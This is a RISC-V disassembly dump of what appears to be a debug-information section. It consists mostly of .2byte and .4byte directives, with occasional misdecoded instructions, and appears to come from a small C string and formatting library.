     1a0:	6e14                	.2byte	0x6e14
     1a2:	0000                	.2byte	0x0
     1a4:	0e00                	.2byte	0xe00
     1a6:	008d                	.2byte	0x8d
     1a8:	0000                	.2byte	0x0
     1aa:	5c09                	.2byte	0x5c09
     1ac:	0000                	.2byte	0x0
     1ae:	0500                	.2byte	0x500
     1b0:	1552                	.2byte	0x1552
     1b2:	0081                	.2byte	0x81
     1b4:	0000                	.2byte	0x0
     1b6:	9e0c                	.2byte	0x9e0c
     1b8:	0000                	.2byte	0x0
     1ba:	0900                	.2byte	0x900
     1bc:	017f 0000 d606 7a17 	.byte	0x7f, 0x01, 0x00, 0x00, 0x06, 0xd6, 0x17, 0x7a, 0x00, 0x00
     1c4:	0000 
     1c6:	0700                	.2byte	0x700
     1c8:	0508                	.2byte	0x508
     1ca:	0208                	.2byte	0x208
     1cc:	0000                	.2byte	0x0
     1ce:	0820                	.2byte	0x820
     1d0:	0821                	.2byte	0x821
     1d2:	000002eb          	.4byte	0x2eb
     1d6:	cf06                	.2byte	0xcf06
     1d8:	0000                	.2byte	0x0
     1da:	0700                	.2byte	0x700
     1dc:	0801                	.2byte	0x801
     1de:	0078                	.2byte	0x78
     1e0:	0000                	.2byte	0x0
     1e2:	cf0c                	.2byte	0xcf0c
     1e4:	0000                	.2byte	0x0
     1e6:	0600                	.2byte	0x600
     1e8:	00d6                	.2byte	0xd6
     1ea:	0000                	.2byte	0x0
     1ec:	7e070807          	.4byte	0x7e070807
     1f0:	0002                	.2byte	0x2
     1f2:	0900                	.2byte	0x900
     1f4:	022a                	.2byte	0x22a
     1f6:	0000                	.2byte	0x0
     1f8:	c41b2807          	flw	fa6,-959(s6)
     1fc:	0000                	.2byte	0x0
     1fe:	0900                	.2byte	0x900
     200:	0231                	.2byte	0x231
     202:	0000                	.2byte	0x0
     204:	e7186307          	.4byte	0xe7186307
     208:	0000                	.2byte	0x0
     20a:	1400                	.2byte	0x1400
     20c:	035e                	.2byte	0x35e
     20e:	0000                	.2byte	0x0
     210:	0000990f          	.4byte	0x990f
     214:	1400                	.2byte	0x1400
     216:	0320                	.2byte	0x320
     218:	0000                	.2byte	0x0
     21a:	9910                	.2byte	0x9910
     21c:	0000                	.2byte	0x0
     21e:	2200                	.2byte	0x2200
     220:	025d                	.2byte	0x25d
     222:	0000                	.2byte	0x0
     224:	9202                	.2byte	0x9202
     226:	0601                	.2byte	0x601
     228:	00000067          	jr	zero # 0 <threadsense.5>
     22c:	8428                	.2byte	0x8428
     22e:	8000                	.2byte	0x8000
     230:	0000                	.2byte	0x0
     232:	0000                	.2byte	0x0
     234:	0110                	.2byte	0x110
     236:	0000                	.2byte	0x0
     238:	0000                	.2byte	0x0
     23a:	0000                	.2byte	0x0
     23c:	9c01                	.2byte	0x9c01
     23e:	0164                	.2byte	0x164
     240:	0000                	.2byte	0x0
     242:	7304                	.2byte	0x7304
     244:	7274                	.2byte	0x7274
     246:	9200                	.2byte	0x9200
     248:	1701                	.2byte	0x1701
     24a:	000000db          	.4byte	0xdb
     24e:	9102                	.2byte	0x9102
     250:	0558                	.2byte	0x558
     252:	6572                	.2byte	0x6572
     254:	01940073          	.4byte	0x1940073
     258:	6708                	.2byte	0x6708
     25a:	0000                	.2byte	0x0
     25c:	0200                	.2byte	0x200
     25e:	6891                	.2byte	0x6891
     260:	0002fd0f          	.4byte	0x2fd0f
     264:	9500                	.2byte	0x9500
     266:	0701                	.2byte	0x701
     268:	004a                	.2byte	0x4a
     26a:	0000                	.2byte	0x0
     26c:	9102                	.2byte	0x9102
     26e:	0064                	.2byte	0x64
     270:	0002c40b          	.4byte	0x2c40b
     274:	2600                	.2byte	0x2600
     276:	ca08                	.2byte	0xca08
     278:	0000                	.2byte	0x0
     27a:	cc00                	.2byte	0xcc00
     27c:	00800083          	lb	ra,8(zero) # 8 <threadsense.5+0x8>
     280:	0000                	.2byte	0x0
     282:	5c00                	.2byte	0x5c00
     284:	0000                	.2byte	0x0
     286:	0000                	.2byte	0x0
     288:	0000                	.2byte	0x0
     28a:	0100                	.2byte	0x100
     28c:	b19c                	.2byte	0xb19c
     28e:	0001                	.2byte	0x1
     290:	0d00                	.2byte	0xd00
     292:	0310                	.2byte	0x310
     294:	0000                	.2byte	0x0
     296:	018a                	.2byte	0x18a
     298:	ca14                	.2byte	0xca14
     29a:	0000                	.2byte	0x0
     29c:	0200                	.2byte	0x200
     29e:	5891                	.2byte	0x5891
     2a0:	7304                	.2byte	0x7304
     2a2:	6372                	.2byte	0x6372
     2a4:	8a00                	.2byte	0x8a00
     2a6:	2601                	.2byte	0x2601
     2a8:	000000db          	.4byte	0xdb
     2ac:	9102                	.2byte	0x9102
     2ae:	0550                	.2byte	0x550
     2b0:	0064                	.2byte	0x64
     2b2:	018c                	.2byte	0x18c
     2b4:	ca09                	.2byte	0xca09
     2b6:	0000                	.2byte	0x0
     2b8:	0200                	.2byte	0x200
     2ba:	6891                	.2byte	0x6891
     2bc:	0b00                	.2byte	0xb00
     2be:	0331                	.2byte	0x331
     2c0:	0000                	.2byte	0x0
     2c2:	0624                	.2byte	0x624
     2c4:	004a                	.2byte	0x4a
     2c6:	0000                	.2byte	0x0
     2c8:	8344                	.2byte	0x8344
     2ca:	8000                	.2byte	0x8000
     2cc:	0000                	.2byte	0x0
     2ce:	0000                	.2byte	0x0
     2d0:	0088                	.2byte	0x88
     2d2:	0000                	.2byte	0x0
     2d4:	0000                	.2byte	0x0
     2d6:	0000                	.2byte	0x0
     2d8:	9c01                	.2byte	0x9c01
     2da:	0000020b          	.4byte	0x20b
     2de:	7304                	.2byte	0x7304
     2e0:	0031                	.2byte	0x31
     2e2:	017e                	.2byte	0x17e
     2e4:	db18                	.2byte	0xdb18
     2e6:	0000                	.2byte	0x0
     2e8:	0200                	.2byte	0x200
     2ea:	5891                	.2byte	0x5891
     2ec:	7304                	.2byte	0x7304
     2ee:	0032                	.2byte	0x32
     2f0:	017e                	.2byte	0x17e
     2f2:	db28                	.2byte	0xdb28
     2f4:	0000                	.2byte	0x0
     2f6:	0200                	.2byte	0x200
     2f8:	5091                	.2byte	0x5091
     2fa:	6305                	.2byte	0x6305
     2fc:	0031                	.2byte	0x31
     2fe:	0180                	.2byte	0x180
     300:	3511                	.2byte	0x3511
     302:	0000                	.2byte	0x0
     304:	0200                	.2byte	0x200
     306:	6f91                	.2byte	0x6f91
     308:	6305                	.2byte	0x6305
     30a:	0032                	.2byte	0x32
     30c:	0180                	.2byte	0x180
     30e:	3515                	.2byte	0x3515
     310:	0000                	.2byte	0x0
     312:	0200                	.2byte	0x200
     314:	6e91                	.2byte	0x6e91
     316:	0b00                	.2byte	0xb00
     318:	0149                	.2byte	0x149
     31a:	0000                	.2byte	0x0
     31c:	00af0977          	.4byte	0xaf0977
     320:	0000                	.2byte	0x0
     322:	82e0                	.2byte	0x82e0
     324:	8000                	.2byte	0x8000
     326:	0000                	.2byte	0x0
     328:	0000                	.2byte	0x0
     32a:	0064                	.2byte	0x64
     32c:	0000                	.2byte	0x0
     32e:	0000                	.2byte	0x0
     330:	0000                	.2byte	0x0
     332:	9c01                	.2byte	0x9c01
     334:	0254                	.2byte	0x254
     336:	0000                	.2byte	0x0
     338:	7304                	.2byte	0x7304
     33a:	7600                	.2byte	0x7600
     33c:	1c01                	.2byte	0x1c01
     33e:	000000db          	.4byte	0xdb
     342:	9102                	.2byte	0x9102
     344:	0458                	.2byte	0x458
     346:	006e                	.2byte	0x6e
     348:	0176                	.2byte	0x176
     34a:	af26                	.2byte	0xaf26
     34c:	0000                	.2byte	0x0
     34e:	0200                	.2byte	0x200
     350:	5091                	.2byte	0x5091
     352:	7005                	.2byte	0x7005
     354:	7800                	.2byte	0x7800
     356:	0f01                	.2byte	0xf01
     358:	000000db          	.4byte	0xdb
     35c:	9102                	.2byte	0x9102
     35e:	0068                	.2byte	0x68
     360:	0002bd0b          	.4byte	0x2bd0b
     364:	2900                	.2byte	0x2900
     366:	af09                	.2byte	0xaf09
     368:	0000                	.2byte	0x0
     36a:	9000                	.2byte	0x9000
     36c:	0082                	.2byte	0x82
     36e:	0080                	.2byte	0x80
     370:	0000                	.2byte	0x0
     372:	5000                	.2byte	0x5000
     374:	0000                	.2byte	0x0
     376:	0000                	.2byte	0x0
     378:	0000                	.2byte	0x0
     37a:	0100                	.2byte	0x100
     37c:	909c                	.2byte	0x909c
     37e:	0002                	.2byte	0x2
     380:	0400                	.2byte	0x400
     382:	016e0073          	.4byte	0x16e0073
     386:	0000db1b          	srlw	s6,ra,0x0
     38a:	0200                	.2byte	0x200
     38c:	5891                	.2byte	0x5891
     38e:	7005                	.2byte	0x7005
     390:	7000                	.2byte	0x7000
     392:	0f01                	.2byte	0xf01
     394:	000000db          	.4byte	0xdb
     398:	9102                	.2byte	0x9102
     39a:	0068                	.2byte	0x68
     39c:	00021b0b          	.4byte	0x21b0b
     3a0:	2100                	.2byte	0x2100
     3a2:	c209                	.2byte	0xc209
     3a4:	0000                	.2byte	0x0
     3a6:	9400                	.2byte	0x9400
     3a8:	0081                	.2byte	0x81
     3aa:	0080                	.2byte	0x80
     3ac:	0000                	.2byte	0x0
     3ae:	fc00                	.2byte	0xfc00
     3b0:	0000                	.2byte	0x0
     3b2:	0000                	.2byte	0x0
     3b4:	0000                	.2byte	0x0
     3b6:	0100                	.2byte	0x100
     3b8:	319c                	.2byte	0x319c
     3ba:	0d000003          	lb	zero,208(zero) # d0 <threadsense.2+0x4c>
     3be:	0310                	.2byte	0x310
     3c0:	0000                	.2byte	0x0
     3c2:	c214015b          	.4byte	0xc214015b
     3c6:	0000                	.2byte	0x0
     3c8:	0200                	.2byte	0x200
     3ca:	4891                	.2byte	0x4891
     3cc:	450d                	.2byte	0x450d
     3ce:	0002                	.2byte	0x2
     3d0:	5b00                	.2byte	0x5b00
     3d2:	1e01                	.2byte	0x1e01
     3d4:	004a                	.2byte	0x4a
     3d6:	0000                	.2byte	0x0
     3d8:	9102                	.2byte	0x9102
     3da:	0444                	.2byte	0x444
     3dc:	656c                	.2byte	0x656c
     3de:	006e                	.2byte	0x6e
     3e0:	af2b015b          	.4byte	0xaf2b015b
     3e4:	0000                	.2byte	0x0
     3e6:	0300                	.2byte	0x300
     3e8:	b891                	.2byte	0xb891
     3ea:	81c4157f 00008000 	.byte	0x7f, 0x15, 0xc4, 0x81, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00
     3f2:	00800000 
     3f6:	0000                	.2byte	0x0
     3f8:	0000                	.2byte	0x0
     3fa:	0000                	.2byte	0x0
     3fc:	0311                	.2byte	0x311
     3fe:	0000                	.2byte	0x0
     400:	0002390f          	.4byte	0x2390f
     404:	5e00                	.2byte	0x5e00
     406:	0f01                	.2byte	0xf01
     408:	009e                	.2byte	0x9e
     40a:	0000                	.2byte	0x0
     40c:	9102                	.2byte	0x9102
     40e:	0558                	.2byte	0x558
     410:	0064                	.2byte	0x64
     412:	31100163          	beq	zero,a7,714 <threadsense.2+0x690>
     416:	02000003          	lb	zero,32(zero) # 20 <threadsense.5+0x20>
     41a:	6891                	.2byte	0x6891
     41c:	1000                	.2byte	0x1000
     41e:	8244                	.2byte	0x8244
     420:	8000                	.2byte	0x8000
     422:	0000                	.2byte	0x0
     424:	0000                	.2byte	0x0
     426:	0038                	.2byte	0x38
     428:	0000                	.2byte	0x0
     42a:	0000                	.2byte	0x0
     42c:	0000                	.2byte	0x0
     42e:	6405                	.2byte	0x6405
     430:	6700                	.2byte	0x6700
     432:	0b01                	.2byte	0xb01
     434:	00ca                	.2byte	0xca
     436:	0000                	.2byte	0x0
     438:	9102                	.2byte	0x9102
     43a:	0060                	.2byte	0x60
     43c:	0600                	.2byte	0x600
     43e:	009e                	.2byte	0x9e
     440:	0000                	.2byte	0x0
     442:	0001990b          	.4byte	0x1990b
     446:	1f00                	.2byte	0x1f00
     448:	c209                	.2byte	0xc209
     44a:	0000                	.2byte	0x0
     44c:	b800                	.2byte	0xb800
     44e:	0080                	.2byte	0x80
     450:	0080                	.2byte	0x80
     452:	0000                	.2byte	0x0
     454:	dc00                	.2byte	0xdc00
     456:	0000                	.2byte	0x0
     458:	0000                	.2byte	0x0
     45a:	0000                	.2byte	0x0
     45c:	0100                	.2byte	0x100
     45e:	e29c                	.2byte	0xe29c
     460:	0d000003          	lb	zero,208(zero) # d0 <threadsense.2+0x4c>
     464:	0310                	.2byte	0x310
     466:	0000                	.2byte	0x0
     468:	c214014b          	fnmsub.d	ft2,fs0,ft1,fs8,rne
     46c:	0000                	.2byte	0x0
     46e:	0200                	.2byte	0x200
     470:	4891                	.2byte	0x4891
     472:	7304                	.2byte	0x7304
     474:	6372                	.2byte	0x6372
     476:	4b00                	.2byte	0x4b00
     478:	2601                	.2byte	0x2601
     47a:	03e2                	.2byte	0x3e2
     47c:	0000                	.2byte	0x0
     47e:	9102                	.2byte	0x9102
     480:	0440                	.2byte	0x440
     482:	656c                	.2byte	0x656c
     484:	006e                	.2byte	0x6e
     486:	af32014b          	.4byte	0xaf32014b
     48a:	0000                	.2byte	0x0
     48c:	0300                	.2byte	0x300
     48e:	b891                	.2byte	0xb891
     490:	80ec157f 00008000 	.byte	0x7f, 0x15, 0xec, 0x80, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x4c, 0x00
     498:	004c0000 
     49c:	0000                	.2byte	0x0
     49e:	0000                	.2byte	0x0
     4a0:	0000                	.2byte	0x0
     4a2:	03b5                	.2byte	0x3b5
     4a4:	0000                	.2byte	0x0
     4a6:	7305                	.2byte	0x7305
     4a8:	4e00                	.2byte	0x4e00
     4aa:	1601                	.2byte	0x1601
     4ac:	03e8                	.2byte	0x3e8
     4ae:	0000                	.2byte	0x0
     4b0:	9102                	.2byte	0x9102
     4b2:	0568                	.2byte	0x568
     4b4:	0064                	.2byte	0x64
     4b6:	3110014f          	fnmadd.s	ft2,ft0,fa7,ft6,rne
     4ba:	02000003          	lb	zero,32(zero) # 20 <threadsense.5+0x20>
     4be:	6091                	.2byte	0x6091
     4c0:	1000                	.2byte	0x1000
     4c2:	8138                	.2byte	0x8138
     4c4:	8000                	.2byte	0x8000
     4c6:	0000                	.2byte	0x0
     4c8:	0000                	.2byte	0x0
     4ca:	0048                	.2byte	0x48
     4cc:	0000                	.2byte	0x0
     4ce:	0000                	.2byte	0x0
     4d0:	0000                	.2byte	0x0
     4d2:	7305                	.2byte	0x7305
     4d4:	5300                	.2byte	0x5300
     4d6:	1101                	.2byte	0x1101
     4d8:	000000db          	.4byte	0xdb
     4dc:	9102                	.2byte	0x9102
     4de:	0558                	.2byte	0x558
     4e0:	0064                	.2byte	0x64
     4e2:	0154                	.2byte	0x154
     4e4:	0000ca0b          	.4byte	0xca0b
     4e8:	0200                	.2byte	0x200
     4ea:	5091                	.2byte	0x5091
     4ec:	0000                	.2byte	0x0
     4ee:	e706                	.2byte	0xe706
     4f0:	23000003          	lb	zero,560(zero) # 230 <threadsense.2+0x1ac>
     4f4:	aa06                	.2byte	0xaa06
     4f6:	0000                	.2byte	0x0
     4f8:	1100                	.2byte	0x1100
     4fa:	0255                	.2byte	0x255
     4fc:	0000                	.2byte	0x0
     4fe:	4a05f403          	.4byte	0x4a05f403
     502:	0000                	.2byte	0x0
     504:	c800                	.2byte	0xc800
     506:	007f 0080 0000 f000 	.byte	0x7f, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0xf0, 0x00, 0x00
     50e:	0000 
     510:	0000                	.2byte	0x0
     512:	0000                	.2byte	0x0
     514:	0100                	.2byte	0x100
     516:	a09c                	.2byte	0xa09c
     518:	0004                	.2byte	0x4
     51a:	0400                	.2byte	0x400
     51c:	00727473          	csrrc	s0,0x7,4
     520:	ca130137          	lui	sp,0xca130
     524:	0000                	.2byte	0x0
     526:	0300                	.2byte	0x300
     528:	8891                	.2byte	0x8891
     52a:	047e                	.2byte	0x47e
     52c:	6d66                	.2byte	0x6d66
     52e:	0074                	.2byte	0x74
     530:	db240137          	lui	sp,0xdb240
     534:	0000                	.2byte	0x0
     536:	0300                	.2byte	0x300
     538:	8091                	.2byte	0x8091
     53a:	167e                	.2byte	0x167e
     53c:	6105                	.2byte	0x6105
     53e:	0070                	.2byte	0x70
     540:	0139                	.2byte	0x139
     542:	0000f30b          	.4byte	0xf30b
     546:	0300                	.2byte	0x300
     548:	b091                	.2byte	0xb091
     54a:	0f7f 01ac 0000 013a 	.byte	0x7f, 0x0f, 0xac, 0x01, 0x00, 0x00, 0x3a, 0x01, 0x09, 0xca
     552:	ca09 
     554:	0000                	.2byte	0x0
     556:	0300                	.2byte	0x300
     558:	b891                	.2byte	0xb891
     55a:	247f 01fa 0000 3d02 	.byte	0x7f, 0x24, 0xfa, 0x01, 0x00, 0x00, 0x02, 0x3d, 0x01, 0x08, 0x6c, 0x7f, 0x00, 0x80
     562:	0801 7f6c 8000 
     568:	0000                	.2byte	0x0
     56a:	0000                	.2byte	0x0
     56c:	005c                	.2byte	0x5c
     56e:	0000                	.2byte	0x0
     570:	0000                	.2byte	0x0
     572:	0000                	.2byte	0x0
     574:	9c01                	.2byte	0x9c01
     576:	06489107          	.4byte	0x6489107
     57a:	06019023          	sh	zero,96(gp)
     57e:	6304                	.2byte	0x6304
     580:	0068                	.2byte	0x68
     582:	013d                	.2byte	0x13d
     584:	4a1a                	.2byte	0x4a1a
     586:	0000                	.2byte	0x0
     588:	0200                	.2byte	0x200
     58a:	5c91                	.2byte	0x5c91
     58c:	df0d                	.2byte	0xdf0d
     58e:	0002                	.2byte	0x2
     590:	3d00                	.2byte	0x3d00
     592:	2501                	.2byte	0x2501
     594:	04a0                	.2byte	0x4a0
     596:	0000                	.2byte	0x0
     598:	9102                	.2byte	0x9102
     59a:	0f50                	.2byte	0xf50
     59c:	0315                	.2byte	0x315
     59e:	0000                	.2byte	0x0
     5a0:	a50c013f 02000004 	.8byte	0x2000004a50c013f
     5a8:	6891                	.2byte	0x6891
     5aa:	0000                	.2byte	0x0
     5ac:	c206                	.2byte	0xc206
     5ae:	0000                	.2byte	0x0
     5b0:	0600                	.2byte	0x600
     5b2:	00ca                	.2byte	0xca
     5b4:	0000                	.2byte	0x0
     5b6:	1411                	.2byte	0x1411
     5b8:	0001                	.2byte	0x1
     5ba:	0300                	.2byte	0x300
     5bc:	05c8                	.2byte	0x5c8
     5be:	004a                	.2byte	0x4a
     5c0:	0000                	.2byte	0x0
     5c2:	7ef4                	.2byte	0x7ef4
     5c4:	8000                	.2byte	0x8000
     5c6:	0000                	.2byte	0x0
     5c8:	0000                	.2byte	0x0
     5ca:	0078                	.2byte	0x78
     5cc:	0000                	.2byte	0x0
     5ce:	0000                	.2byte	0x0
     5d0:	0000                	.2byte	0x0
     5d2:	9c01                	.2byte	0x9c01
     5d4:	04ed                	.2byte	0x4ed
     5d6:	0000                	.2byte	0x0
     5d8:	6604                	.2byte	0x6604
     5da:	746d                	.2byte	0x746d
     5dc:	2c00                	.2byte	0x2c00
     5de:	1801                	.2byte	0x1801
     5e0:	000000db          	.4byte	0xdb
     5e4:	7f989103          	lh	sp,2041(a7)
     5e8:	0516                	.2byte	0x516
     5ea:	7061                	.2byte	0x7061
     5ec:	2e00                	.2byte	0x2e00
     5ee:	0b01                	.2byte	0xb01
     5f0:	000000f3          	.4byte	0xf3
     5f4:	7fa89103          	lh	sp,2042(a7)
     5f8:	1700                	.2byte	0x1700
     5fa:	01d2                	.2byte	0x1d2
     5fc:	0000                	.2byte	0x0
     5fe:	0d95                	.2byte	0xd95
     600:	7ab4                	.2byte	0x7ab4
     602:	8000                	.2byte	0x8000
     604:	0000                	.2byte	0x0
     606:	0000                	.2byte	0x0
     608:	0440                	.2byte	0x440
     60a:	0000                	.2byte	0x0
     60c:	0000                	.2byte	0x0
     60e:	0000                	.2byte	0x0
     610:	9c01                	.2byte	0x9c01
     612:	0625                	.2byte	0x625
     614:	0000                	.2byte	0x0
     616:	0201                	.2byte	0x201
     618:	0002                	.2byte	0x2
     61a:	0200                	.2byte	0x200
     61c:	1e95                	.2byte	0x1e95
     61e:	0635                	.2byte	0x635
     620:	0000                	.2byte	0x0
     622:	7fa89103          	lh	sp,2042(a7)
     626:	3e01                	.2byte	0x3e01
     628:	0002                	.2byte	0x2
     62a:	0200                	.2byte	0x200
     62c:	3a95                	.2byte	0x3a95
     62e:	04a0                	.2byte	0x4a0
     630:	0000                	.2byte	0x0
     632:	7fa09103          	lh	sp,2042(ra)
     636:	746d6603          	lwu	a2,1862(s10)
     63a:	0200                	.2byte	0x200
     63c:	4e95                	.2byte	0x4e95
     63e:	000000db          	.4byte	0xdb
     642:	7f989103          	lh	sp,2041(a7)
     646:	00706103          	lwu	sp,7(zero) # 7 <threadsense.5+0x7>
     64a:	9502                	.2byte	0x9502
     64c:	0000f35b          	.4byte	0xf35b
     650:	0300                	.2byte	0x300
     652:	9091                	.2byte	0x9091
     654:	027f 0070 9702 db18 	.byte	0x7f, 0x02, 0x70, 0x00, 0x02, 0x97, 0x18, 0xdb, 0x00, 0x00
     65c:	0000 
     65e:	0100                	.2byte	0x100
     660:	0862                	.2byte	0x862
     662:	000002cb          	fnmsub.s	ft5,ft0,ft0,ft0,rne
     666:	9802                	.2byte	0x9802
     668:	0000db0f          	.4byte	0xdb0f
     66c:	0300                	.2byte	0x300
     66e:	b891                	.2byte	0xb891
     670:	027f 6863 0200 1099 	.byte	0x7f, 0x02, 0x63, 0x68, 0x00, 0x02, 0x99, 0x10, 0x4a, 0x00
     678:	004a 
     67a:	0000                	.2byte	0x0
     67c:	5901                	.2byte	0x5901
     67e:	6525                	.2byte	0x6525
     680:	7272                	.2byte	0x7272
     682:	0200                	.2byte	0x200
     684:	1499                	.2byte	0x1499
     686:	004a                	.2byte	0x4a
     688:	0000                	.2byte	0x0
     68a:	6e02                	.2byte	0x6e02
     68c:	6d75                	.2byte	0x6d75
     68e:	0200                	.2byte	0x200
     690:	169a                	.2byte	0x169a
     692:	00e0                	.2byte	0xe0
     694:	0000                	.2byte	0x0
     696:	9102                	.2byte	0x9102
     698:	0858                	.2byte	0x858
     69a:	0370                	.2byte	0x370
     69c:	0000                	.2byte	0x0
     69e:	9b02                	.2byte	0x9b02
     6a0:	00004a07          	.4byte	0x4a07
     6a4:	0200                	.2byte	0x200
     6a6:	5491                	.2byte	0x5491
     6a8:	9308                	.2byte	0x9308
     6aa:	0001                	.2byte	0x1
     6ac:	0200                	.2byte	0x200
     6ae:	004a0d9b          	addw	s11,s4,4
     6b2:	0000                	.2byte	0x0
     6b4:	9102                	.2byte	0x9102
     6b6:	0850                	.2byte	0x850
     6b8:	01dc                	.2byte	0x1dc
     6ba:	0000                	.2byte	0x0
     6bc:	9b02                	.2byte	0x9b02
     6be:	4a14                	.2byte	0x4a14
     6c0:	0000                	.2byte	0x0
     6c2:	0200                	.2byte	0x200
     6c4:	4c91                	.2byte	0x4c91
     6c6:	5908                	.2byte	0x5908
     6c8:	0001                	.2byte	0x1
     6ca:	0200                	.2byte	0x200
     6cc:	004a1b9b          	sllw	s7,s4,0x4
     6d0:	0000                	.2byte	0x0
     6d2:	9102                	.2byte	0x9102
     6d4:	0848                	.2byte	0x848
     6d6:	0329                	.2byte	0x329
     6d8:	0000                	.2byte	0x0
     6da:	9b02                	.2byte	0x9b02
     6dc:	4a26                	.2byte	0x4a26
     6de:	0000                	.2byte	0x0
     6e0:	0300                	.2byte	0x300
     6e2:	b491                	.2byte	0xb491
     6e4:	087f 017a 0000 9c02 	.byte	0x7f, 0x08, 0x7a, 0x01, 0x00, 0x00, 0x02, 0x9c, 0x08, 0xcf
     6ec:	cf08 
     6ee:	0000                	.2byte	0x0
     6f0:	0200                	.2byte	0x200
     6f2:	4791                	.2byte	0x4791
     6f4:	7518                	.2byte	0x7518
     6f6:	0002                	.2byte	0x2
     6f8:	ae00                	.2byte	0xae00
     6fa:	007b5c03          	lhu	s8,7(s6)
     6fe:	0080                	.2byte	0x80
     700:	0000                	.2byte	0x0
     702:	1800                	.2byte	0x1800
     704:	0151                	.2byte	0x151
     706:	0000                	.2byte	0x0
     708:	05da                	.2byte	0x5da
     70a:	7c68                	.2byte	0x7c68
     70c:	8000                	.2byte	0x8000
     70e:	0000                	.2byte	0x0
     710:	0000                	.2byte	0x0
     712:	b319                	.2byte	0xb319
     714:	0001                	.2byte	0x1
     716:	1a00                	.2byte	0x1a00
     718:	8001                	.2byte	0x8001
     71a:	007e                	.2byte	0x7e
     71c:	0080                	.2byte	0x80
     71e:	0000                	.2byte	0x0
     720:	1900                	.2byte	0x1900
     722:	01b1                	.2byte	0x1b1
     724:	0000                	.2byte	0x0
     726:	0118                	.2byte	0x118
     728:	7e68                	.2byte	0x7e68
     72a:	8000                	.2byte	0x8000
     72c:	0000                	.2byte	0x0
     72e:	0000                	.2byte	0x0
     730:	2600                	.2byte	0x2600
     732:	0635                	.2byte	0x635
     734:	0000                	.2byte	0x0
     736:	4a1a                	.2byte	0x4a1a
     738:	0000                	.2byte	0x0
     73a:	1a00                	.2byte	0x1a00
     73c:	04a0                	.2byte	0x4a0
     73e:	0000                	.2byte	0x0
     740:	0600                	.2byte	0x600
     742:	0625                	.2byte	0x625
     744:	0000                	.2byte	0x0
     746:	020a                	.2byte	0x20a
     748:	02000003          	lb	zero,32(zero) # 20 <threadsense.5+0x20>
     74c:	00bb128b          	.4byte	0xbb128b
     750:	0000                	.2byte	0x0
     752:	7a20                	.2byte	0x7a20
     754:	8000                	.2byte	0x8000
     756:	0000                	.2byte	0x0
     758:	0000                	.2byte	0x0
     75a:	0094                	.2byte	0x94
     75c:	0000                	.2byte	0x0
     75e:	0000                	.2byte	0x0
     760:	0000                	.2byte	0x0
     762:	9c01                	.2byte	0x9c01
     764:	067a                	.2byte	0x67a
     766:	0000                	.2byte	0x0
     768:	00706103          	lwu	sp,7(zero) # 7 <threadsense.5+0x7>
     76c:	8b02                	.2byte	0x8b02
     76e:	7a22                	.2byte	0x7a22
     770:	0006                	.2byte	0x6
     772:	0200                	.2byte	0x200
     774:	6891                	.2byte	0x6891
     776:	9301                	.2byte	0x9301
     778:	0001                	.2byte	0x1
     77a:	0200                	.2byte	0x200
     77c:	004a2a8b          	.4byte	0x4a2a8b
     780:	0000                	.2byte	0x0
     782:	9102                	.2byte	0x9102
     784:	0064                	.2byte	0x64
     786:	f306                	.2byte	0xf306
     788:	0000                	.2byte	0x0
     78a:	0a00                	.2byte	0xa00
     78c:	0222                	.2byte	0x222
     78e:	0000                	.2byte	0x0
     790:	8102                	.2byte	0x8102
     792:	0000e01b          	.4byte	0xe01b
     796:	8400                	.2byte	0x8400
     798:	0079                	.2byte	0x79
     79a:	0080                	.2byte	0x80
     79c:	0000                	.2byte	0x0
     79e:	9c00                	.2byte	0x9c00
     7a0:	0000                	.2byte	0x0
     7a2:	0000                	.2byte	0x0
     7a4:	0000                	.2byte	0x0
     7a6:	0100                	.2byte	0x100
     7a8:	bf9c                	.2byte	0xbf9c
     7aa:	0006                	.2byte	0x6
     7ac:	0300                	.2byte	0x300
     7ae:	7061                	.2byte	0x7061
     7b0:	0200                	.2byte	0x200
     7b2:	2c81                	.2byte	0x2c81
     7b4:	067a                	.2byte	0x67a
     7b6:	0000                	.2byte	0x0
     7b8:	9102                	.2byte	0x9102
     7ba:	0168                	.2byte	0x168
     7bc:	00000193          	li	gp,0
     7c0:	8102                	.2byte	0x8102
     7c2:	4a34                	.2byte	0x4a34
     7c4:	0000                	.2byte	0x0
     7c6:	0200                	.2byte	0x200
     7c8:	6491                	.2byte	0x6491
     7ca:	1700                	.2byte	0x1700
     7cc:	0344                	.2byte	0x344
     7ce:	0000                	.2byte	0x0
     7d0:	146c                	.2byte	0x146c
     7d2:	7838                	.2byte	0x7838
     7d4:	8000                	.2byte	0x8000
     7d6:	0000                	.2byte	0x0
     7d8:	0000                	.2byte	0x0
     7da:	014c                	.2byte	0x14c
     7dc:	0000                	.2byte	0x0
     7de:	0000                	.2byte	0x0
     7e0:	0000                	.2byte	0x0
     7e2:	9c01                	.2byte	0x9c01
     7e4:	075c                	.2byte	0x75c
     7e6:	0000                	.2byte	0x0
     7e8:	0201                	.2byte	0x201
     7ea:	0002                	.2byte	0x2
     7ec:	0200                	.2byte	0x200
     7ee:	246c                	.2byte	0x246c
     7f0:	0635                	.2byte	0x635
     7f2:	0000                	.2byte	0x0
     7f4:	7dd89103          	lh	sp,2013(a7)
     7f8:	3e01                	.2byte	0x3e01
     7fa:	0002                	.2byte	0x2
     7fc:	0200                	.2byte	0x200
     7fe:	406c                	.2byte	0x406c
     800:	04a0                	.2byte	0x4a0
     802:	0000                	.2byte	0x0
     804:	7dd09103          	lh	sp,2013(ra)
     808:	6d756e03          	lwu	t3,1751(a0)
     80c:	0200                	.2byte	0x200
     80e:	286d                	.2byte	0x286d
     810:	00e0                	.2byte	0xe0
     812:	0000                	.2byte	0x0
     814:	7dc89103          	lh	sp,2012(a7)
     818:	7001                	.2byte	0x7001
     81a:	02000003          	lb	zero,32(zero) # 20 <threadsense.5+0x20>
     81e:	366d                	.2byte	0x366d
     820:	0060                	.2byte	0x60
     822:	0000                	.2byte	0x0
     824:	7dc49103          	lh	sp,2012(s1)
     828:	dc01                	.2byte	0xdc01
     82a:	0001                	.2byte	0x1
     82c:	0200                	.2byte	0x200
     82e:	406d                	.2byte	0x406d
     830:	004a                	.2byte	0x4a
     832:	0000                	.2byte	0x0
     834:	7dc09103          	lh	sp,2012(ra)
     838:	7a01                	.2byte	0x7a01
     83a:	0001                	.2byte	0x1
     83c:	0200                	.2byte	0x200
     83e:	4b6d                	.2byte	0x4b6d
     840:	004a                	.2byte	0x4a
     842:	0000                	.2byte	0x0
     844:	7dbc9103          	lh	sp,2011(s9)
